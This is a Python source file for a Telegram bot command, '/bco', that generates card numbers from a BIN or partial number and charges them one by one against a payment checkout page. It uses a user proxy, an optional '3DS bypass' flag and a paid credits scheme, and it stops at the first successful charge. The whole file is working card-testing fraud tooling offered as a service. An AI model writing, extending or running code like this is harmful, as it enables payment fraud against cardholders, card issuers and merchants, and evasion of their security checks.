# commands/bco.py
"""
BIN-based checkout command - generates valid cards from BIN/partial card number
Generates and charges cards one by one until success or cancellation
"""

import time
import asyncio
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from functions.proxy_utils import (
    get_user_proxy,
    get_proxy_info,
    check_access
)
from functions.co_functions import (
    extract_checkout_url,
    get_checkout_info,
    get_currency_symbol,
    check_checkout_active
)
from functions.bin_utils import (
    detect_card_brand,
    generate_next_card,
    format_card_for_display,
    get_card_info,
    batch_generate_cards
)
from functions.charge_functions import charge_card, ChargeStatus

# Import database and credit modules
from database.repositories import UserRepository
from config_bot.credit_costs import CREDIT_COSTS, PER_CARD_COST
from config import OWNER_ID

router = Router()
user_repo = UserRepository()

# Store active sessions to check cancellation
active_sessions = {}

# Response templates
RESPONSES = {
    "insufficient_credits": (
        "[❌] <b>Insufficient Credits</b>\n\n"
        "You need {cost} credit(s) for this operation.\n"
        "Your balance: {balance}\n"
        "Use /buy to purchase credits."
    ),
}

@router.message(Command("bco"))
async def bco_handler(msg: Message):
    """BIN-based checkout command - generates cards one by one until success"""
    if not check_access(msg):
        await msg.answer(
            "❌ <b>Access Denied</b>\n\n"
            "Join to use: @XMANSPEAK",
            parse_mode=ParseMode.HTML
        )
        return
    
    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    
    # Parse arguments: /bco [url] [yes/no] [BIN]
    args = text.strip().split(maxsplit=3)
    
    if len(args) < 2:
        await msg.answer(
            "<b>📦 BIN CHECKOUT COMMAND</b>\n\n"
            "<b>Usage:</b>\n"
            "• <code>/bco [url] [BIN]</code> – Generate and charge cards until success\n"
            "• <code>/bco [url] yes [BIN]</code> – Generate and charge with bypass\n\n"
            "<b>Examples:</b>\n"
            "<code>/bco https://... 374355</code> (6-digit BIN)\n"
            "<code>/bco https://... 3743551236</code> (10-digit partial)\n"
            "<code>/bco https://... yes 374355</code> (with bypass)\n\n"
            "<b>How it works:</b>\n"
            "• Generates cards one by one from your input\n"
            "• Stops immediately when a card succeeds\n"
            "• Stops if checkout expires or gets cancelled\n"
            "• Maximum 20 cards will be generated",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract URL
    url = extract_checkout_url(args[1])
    if not url:
        url = args[1].strip()
    
    # Parse arguments
    bypass_3ds = False
    user_input = ""
    max_cards = 20  # Maximum cards to generate
    
    if len(args) == 3:
        # Format: /bco url BIN
        user_input = args[2].strip()
    elif len(args) == 4:
        # Check if second arg is yes/no
        if args[2].lower() in ['yes', 'no']:
            bypass_3ds = args[2].lower() == 'yes'
            user_input = args[3].strip()
        else:
            user_input = args[2].strip()
    
    # Validate input (must contain digits)
    input_clean = ''.join(filter(str.isdigit, user_input))
    if len(input_clean) < 6:
        await msg.answer(
            "❌ <b>Invalid Input</b>\n\n"
            "Please provide at least 6 digits (BIN or partial card number)",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get card info for display
    try:
        card_info = get_card_info(input_clean)
        brand = card_info['brand']
        target_length = card_info['target_length']
        will_generate = card_info['will_generate']
        action = card_info['action']
    except Exception as e:
        await msg.answer(
            f"❌ <b>Error detecting card brand</b>\n\n"
            f"{str(e)}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get user proxy
    user_proxy = get_user_proxy(user_id)
    if not user_proxy:
        await msg.answer(
            "❌ <b>No Proxy</b>\n\n"
            "You must set a proxy first\n"
            "<code>/addproxy host:port:user:pass</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check proxy
    proxy_info = await get_proxy_info(user_proxy)
    if proxy_info["status"] == "dead":
        await msg.answer(
            "❌ <b>Proxy Dead</b>\n\n"
            "Your proxy is not responding\n"
            "Check <code>/proxy</code> or <code>/removeproxy</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Processing message
    processing_msg = await msg.answer(
        f"<b>🔄 BIN CHECKOUT STARTED</b>\n\n"
        f"• Input: <code>{input_clean}</code> ({len(input_clean)} digits)\n"
        f"• Brand: <code>{brand}</code>\n"
        f"• Card length: <code>{target_length} digits</code>\n"
        f"• {action}\n"
        f"• Bypass: {'🔓 YES' if bypass_3ds else '🔒 NO'}\n"
        f"• Max cards: <code>{max_cards}</code>\n\n"
        f"⏳ Parsing checkout...",
        parse_mode=ParseMode.HTML
    )
    
    # Get checkout info
    checkout_data = await get_checkout_info(url)
    
    if checkout_data.get("error"):
        await processing_msg.edit_text(
            f"❌ <b>Error</b>\n\n"
            f"• {checkout_data['error']}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check credits before processing
    if user_id != OWNER_ID:
        # BCO generates and tries multiple cards, charge 1 credit per attempt
        # But we'll charge a base fee for using the command
        cost = CREDIT_COSTS.get("/bco", 1)
        
        # Check and deduct credits
        success, before, after = user_repo.use_credits(
            user_id, 
            cost, 
            "/bco",
            {"bin": input_clean, "url": url[:50] + "..." if len(url) > 50 else url}
        )
        
        if not success:
            await processing_msg.edit_text(
                RESPONSES["insufficient_credits"].format(cost=cost, balance=before),
                parse_mode=ParseMode.HTML
            )
            return
    
    # Store session info for cancellation tracking
    session_key = f"{user_id}:{checkout_data['cs']}"
    active_sessions[session_key] = {
        "active": True,
        "message_id": processing_msg.message_id,
        "chat_id": msg.chat.id,
        "start_time": start_time,
        "credits_deducted": user_id != OWNER_ID  # Track if credits were deducted
    }
    
    price_display = ""
    if checkout_data.get("is_free_trial"):
        price_display = "🎁 FREE TRIAL"
    else:
        currency = checkout_data.get('currency', '')
        sym = get_currency_symbol(currency)
        price_display = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
    
    await processing_msg.edit_text(
        f"<b>💳 BIN CHECKOUT ACTIVE</b>\n\n"
        f"<b>Merchant:</b> {checkout_data.get('merchant', 'N/A')}\n"
        f"<b>Amount:</b> {price_display}\n"
        f"<b>Input:</b> <code>{input_clean}</code> ({len(input_clean)} digits)\n"
        f"<b>Brand:</b> <code>{brand}</code>\n"
        f"<b>Target length:</b> <code>{target_length} digits</code>\n"
        f"<b>Will generate:</b> <code>{will_generate} digits</code> per card\n"
        f"<b>Bypass:</b> {'🔓 YES' if bypass_3ds else '🔒 NO'}\n\n"
        f"<b>Status:</b> ⏳ Generating first card...",
        parse_mode=ParseMode.HTML
    )
    
    # Start charging cards one by one until success
    await charge_cards_until_success(
        msg=processing_msg,
        user_input=input_clean,
        checkout_data=checkout_data,
        user_proxy=user_proxy,
        bypass_3ds=bypass_3ds,
        start_time=start_time,
        price_display=price_display,
        url=url,
        session_key=session_key,
        max_cards=max_cards
    )
    
    # Remove from active sessions
    if session_key in active_sessions:
        del active_sessions[session_key]

async def charge_cards_until_success(msg: Message, user_input: str, checkout_data: dict, 
                                     user_proxy: str, bypass_3ds: bool, start_time: float,
                                     price_display: str, url: str, session_key: str, 
                                     max_cards: int = 20):
    """Generate and charge cards one by one until success or cancellation"""
    
    card_number = 1
    results = []
    charged_card = None
    successful_card_data = None
    last_check_time = time.time()
    
    while card_number <= max_cards:
        # Check if session is still active (every iteration)
        if session_key not in active_sessions or not active_sessions[session_key]["active"]:
            await show_cancelled_result(msg, checkout_data, results, card_number - 1, 
                                       price_display, start_time, "Session manually stopped")
            return
        
        # Check if checkout is still active (every 3 cards)
        if card_number % 3 == 0 or time.time() - last_check_time > 30:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                await show_cancelled_result(msg, checkout_data, results, card_number - 1,
                                           price_display, start_time, "Checkout expired or cancelled")
                return
            last_check_time = time.time()
        
        # Generate next card
        try:
            card_dict = generate_next_card(user_input)
            if not card_dict:
                # If generation fails, try next card
                card_number += 1
                continue
                
            card_display = f"{card_dict['cc'][:6]}••••••{card_dict['cc'][-4:]}"
        except Exception as e:
            print(f"[DEBUG] Card generation error: {e}")
            card_number += 1
            continue
        
        # Update progress message
        charged_count = sum(1 for r in results if r['status'] == 'CHARGED')
        declined_count = len(results) - charged_count  # Everything else is declined
        
        await msg.edit_text(
            f"<b>💳 CHARGING CARD #{card_number}</b>\n\n"
            f"<b>Merchant:</b> {checkout_data.get('merchant', 'N/A')}\n"
            f"<b>Amount:</b> {price_display}\n"
            f"<b>Card:</b> <code>{card_display}</code>\n"
            f"<b>Brand:</b> {card_dict['brand']}\n"
            f"<b>Bypass:</b> {'🔓 YES' if bypass_3ds else '🔒 NO'}\n\n"
            f"<b>Results so far:</b>\n"
            f"• Tried: {card_number - 1} cards\n"
            f"• ✅ Charged: {charged_count}\n"
            f"• ❌ Declined: {declined_count}\n\n"
            f"⏳ Charging...",
            parse_mode=ParseMode.HTML
        )
        
        # Charge the card
        result = await charge_card(card_dict, checkout_data, user_proxy, bypass_3ds)
        results.append(result)
        
        # Check if successful
        if result['status'] == ChargeStatus.CHARGED:
            charged_card = result
            successful_card_data = card_dict  # Store the generated card data
            await show_success_result(msg, checkout_data, charged_card, results, 
                                     card_number, price_display, start_time, url, successful_card_data)
            return
        
        # Check if checkout became inactive during charge
        if card_number % 3 == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                await show_cancelled_result(msg, checkout_data, results, card_number,
                                           price_display, start_time, "Checkout expired during charge")
                return
        
        card_number += 1
        await asyncio.sleep(0.5)  # Small delay between cards
    
    # If we've tried max_cards without success
    await show_max_cards_reached(msg, checkout_data, results, max_cards, price_display, start_time, url)

async def show_success_result(msg: Message, checkout_data: dict, charged_card: dict, 
                             results: list, cards_tried: int, price_display: str, 
                             start_time: float, url: str, generated_card: dict = None):
    """Show success result when a card is charged with the generated card details"""
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    # Get the full generated card details
    if generated_card:
        full_card = generated_card.get('card_string', 'N/A')
    else:
        # Fallback to charged_card if generated_card not provided
        full_card = charged_card['card']
    
    response = f"""
<b>✅ PAYMENT SUCCESSFUL</b>

┌─────────────────────────────┐
│     🎉 CHARGED SUCCESSFULLY  │
└─────────────────────────────┘

<b>🏪 MERCHANT</b>
• Name: <code>{checkout_data.get('merchant', 'N/A')}</code>
• Product: <code>{checkout_data.get('product', 'N/A')}</code>
• Amount: <code>{price_display}</code>

<b>💳 GENERATED CARD (SUCCESS)</b>
• <code>{full_card}</code>

<b>✅ CHARGE DETAILS</b>
• Status: ✅ <b>CHARGED</b>
• Response: <code>{charged_card['response']}</code>
• Time: <code>{charged_card['time']}s</code>

<b>⏱️ TOTAL TIME</b>
• <code>{total_time}s</code>

<b>🔗 ACTIONS</b>
• <a href="{url}">Open Checkout</a>
"""
    await msg.edit_text(response.strip(), parse_mode=ParseMode.HTML, disable_web_page_preview=True)

async def show_max_cards_reached(msg: Message, checkout_data: dict, results: list,
                                max_cards: int, price_display: str, start_time: float, url: str):
    """Show result when maximum cards reached without success"""
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    # Count only CHARGED as success, everything else as DECLINED
    charged = sum(1 for r in results if r['status'] == 'CHARGED')
    declined = len(results) - charged  # Everything else is declined
    
    response = f"""
<b>⚠️ MAXIMUM CARDS REACHED</b>

<b>🏪 MERCHANT</b>
• Name: <code>{checkout_data.get('merchant', 'N/A')}</code>
• Amount: <code>{price_display}</code>

<b>📊 FINAL STATISTICS</b>
• Total cards tried: <code>{len(results)}/{max_cards}</code>
• ✅ Charged: <code>{charged}</code>
• ❌ Declined: <code>{declined}</code>

<b>⏱️ TOTAL TIME</b>
• <code>{total_time}s</code>

<b>🔗 ACTIONS</b>
• <a href="{url}">Open Checkout</a>
"""
    await msg.edit_text(response.strip(), parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def show_cancelled_result(msg: Message, checkout_data: dict, results: list,
                               cards_tried: int, price_display: str, start_time: float, reason: str):
    """Show cancelled result when checkout expires or gets cancelled"""
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    # Count only CHARGED as success, everything else as DECLINED
    charged = sum(1 for r in results if r['status'] == 'CHARGED')
    declined = cards_tried - charged
    
    response = f"""
<b>⏹️ CHECKOUT CANCELLED</b>

┌─────────────────────────────┐
│        🛑 STOPPED            │
└─────────────────────────────┘

<b>🏪 MERCHANT</b>
• Name: <code>{checkout_data.get('merchant', 'N/A')}</code>
• Amount: <code>{price_display}</code>

<b>📋 REASON</b>
• <code>{reason}</code>

<b>📊 SUMMARY</b>
• Cards tried: <code>{cards_tried}</code>
• ✅ Charged: <code>{charged}</code>
• ❌ Declined: <code>{declined}</code>

<b>⏱️ TOTAL TIME</b>
• <code>{total_time}s</code>
"""
    await msg.edit_text(response.strip(), parse_mode=ParseMode.HTML)

@router.message(Command("stopbco"))
async def stop_bco_handler(msg: Message):
    """Manually stop a running BCO session"""
    if not check_access(msg):
        await msg.answer(
            "❌ <b>Access Denied</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = msg.from_user.id
    
    # Find and stop active sessions for this user
    stopped = 0
    for key, session in list(active_sessions.items()):
        if key.startswith(f"{user_id}:"):
            session["active"] = False
            stopped += 1
    
    if stopped > 0:
        await msg.answer(
            f"✅ <b>Stopped {stopped} active BCO session(s)</b>",
            parse_mode=ParseMode.HTML
        )
    else:
        await msg.answer(
            "❌ <b>No active BCO sessions found</b>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("bininfo"))
async def bin_info_handler(msg: Message):
    """Get information about a BIN without charging"""
    if not check_access(msg):
        await msg.answer("❌ Access Denied", parse_mode=ParseMode.HTML)
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        await msg.answer(
            "<b>🔍 BIN INFO</b>\n\n"
            "Usage: <code>/bininfo [BIN]</code>\n"
            "Example: <code>/bininfo 374355</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_input = args[1].strip()
    input_clean = ''.join(filter(str.isdigit, user_input))
    
    if len(input_clean) < 6:
        await msg.answer("❌ Please provide at least 6 digits", parse_mode=ParseMode.HTML)
        return
    
    try:
        info = get_card_info(input_clean)
        
        # Generate a sample card
        sample_card = generate_next_card(input_clean)
        sample_display = format_card_for_display(sample_card) if sample_card else "Could not generate"
        
        response = f"""
<b>🔍 BIN INFORMATION</b>

<b>Input:</b> <code>{input_clean}</code> ({len(input_clean)} digits)
<b>Brand:</b> <code>{info['brand']}</code>
<b>Valid lengths:</b> <code>{info['valid_lengths']}</code>
<b>Target length:</b> <code>{info['target_length']} digits</code>
<b>CVV length:</b> <code>{info['cvv_length']} digits</code>
<b>Action:</b> {info['action']}

<b>Sample generated card:</b>
{sample_display}
"""
        await msg.answer(response.strip(), parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await msg.answer(f"❌ Error: {str(e)}", parse_mode=ParseMode.HTML)